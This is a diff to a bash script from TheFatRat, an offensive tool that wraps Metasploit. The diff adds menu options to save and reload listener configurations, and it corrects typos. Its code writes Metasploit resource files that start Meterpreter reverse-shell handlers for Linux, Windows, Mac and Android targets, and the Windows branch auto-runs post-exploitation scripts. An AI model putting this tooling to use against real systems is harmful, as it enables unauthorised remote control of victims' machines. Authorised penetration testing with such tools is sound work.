@@ -76,6 +76,7 @@ msploit=$path/logs/msploit.log
 lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
 hostn=`host $publicip | awk '{print $5}'`
+list=$path/config/listeners
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -931,11 +932,12 @@ echo -e $okegreen"  ============================================================
 echo -e " |                     $cyan        Created by $red Edo Maland  ( Screetsec )  $okegreen | "
 echo -e $okegreen"  ===================================================================== "
 			echo ""
- 			echo -e $okegreen"	[1]  Liseners for payload linux"
- 			echo -e "	[2]  Liseners for payload Windows"
-			echo -e "        [3]  Liseners for payload Mac"
- 			echo -e "	[4]  Liseners for payload Android"
-			echo -e "        [5]  Back to Menu "
+ 			echo -e $okegreen"	[1]  Listeners for payload linux"
+ 			echo -e "	[2]  Listeners for payload Windows"
+			echo -e "        [3]  Listeners for payload Mac"
+ 			echo -e "	[4]  Listeners for payload Android"
+                        echo -e "	[5]  Load a saved Listener"
+			echo -e "        [6]  Back to Menu "
  			echo -e " "
  			echo -n -e $red'  \033[4mListeners@fatrat:\033[0m>> '; tput sgr0 #insert your choice
  			read fatrat1
@@ -958,8 +960,18 @@ echo -e $okegreen ""
            	 		echo set LPORT $uservar >> "temp/meterpreter_linux.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_linux.rc"
            	 		echo exploit -j  >> "temp/meterpreter_linux.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc"
+                                zenity --question --text="Do you want to save this configuration to use in future ?"
+                                if [ $? = 0 ] ; then
+                                save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="linux-config");
+                                cp $path/temp/meterpreter_linux.rc $list/$save.rc >/dev/null 2>&1
+                                echo -e okegreen "Configuration file saved to $list/$save.rc"
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc"
                                 clear
+                                else
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc"
+                                clear
+                                fi
+           	 		
 			elif test $fatrat1 == '2' #Windows
 				then
 				rm temp/*.rc > /dev/null 2>&1
@@ -980,8 +992,18 @@ echo -e $okegreen ""
 				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> "temp/meterpreter_windows.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
            	 		echo exploit -j  >> "temp/meterpreter_windows.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc"
-				clear
+                                zenity --question --text="Do you want to save this configuration to use in future ?"
+                                if [ $? = 0 ] ; then
+                                save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="windows-config");
+                                cp $path/temp/meterpreter_windows.rc $list/$save.rc >/dev/null 2>&1
+                                echo -e okegreen "Configuration file saved to $list/$save.rc"
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc"
+                                clear
+                                else
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc"
+                                clear
+                                fi
+           	 		
 			elif test $fatrat1 == '3'  #Mac
 				then
 				rm temp/*.rc > /dev/null 2>&1
@@ -999,9 +1021,18 @@ echo -e $okegreen ""
            	 		echo set LPORT $uservar >> "temp/meterpreter_mac.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_mac.rc"
            	 		echo exploit -j  >> "temp/meterpreter_mac.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc"
-				clear
-
+                                zenity --question --text="Do you want to save this configuration to use in future ?"
+                                if [ $? = 0 ] ; then
+                                save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="mac-config");
+                                cp $path/temp/meterpreter_mac.rc $list/$save.rc >/dev/null 2>&1
+                                echo -e okegreen "Configuration file saved to $list/$save.rc"
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc"
+                                clear
+                                else
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc"
+                                clear
+                                fi
+           	 		
 			elif test $fatrat1 == '4' #Android
 				then
 				rm temp/*.rc > /dev/null 2>&1
@@ -1013,17 +1044,39 @@ echo -e $okegreen ""
                                 echo -e $yellow "Your local IP address is : $lanip"
                                 echo -e $yellow "Your public IP address is : $publicip"
                                 echo -e $yellow "Your Hostname is : $hostn"
-                                echo -e $green ""
+                                echo -e $okegreen ""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_android.rc"
            	 		read -p '  Set LPORT: ' uservar
            	 		echo set LPORT $uservar >> "temp/meterpreter_android.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_android.rc"
            	 		echo exploit -j  >> "temp/meterpreter_android.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc"
-				clear
+                                zenity --question --text="Do you want to save this configuration to use in future ?"
+                                if [ $? = 0 ] ; then
+                                save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="android-config");
+                                cp $path/temp/meterpreter_android.rc $list/$save.rc >/dev/null 2>&1
+                                echo -e okegreen "Configuration file saved to $list/$save.rc"
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc"
+                                clear
+                                else
+                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc"
+                                clear
+                                fi
+           	 		
+                              elif test $fatrat1 == '5'
+                              then
+                  listener=$(zenity --file-selection --file-filter='RC files (rc) | *.rc' --title="Load your config file" --filename=$path/config/listeners/ );
+                  ret=$?
+                  if [ $ret = "0" ]; then
+                  xterm -fa monaco -fs 13 -bg black -e $msfconsole -r $listener
+                  clear
+                  menu
+                  fi
+                  if [ $ret = "1" ]; then
+                  clear
+                  fi
 
-			elif test $fatrat1 == '5'
+			elif test $fatrat1 == '6'
 				then
  				clear
 				menu
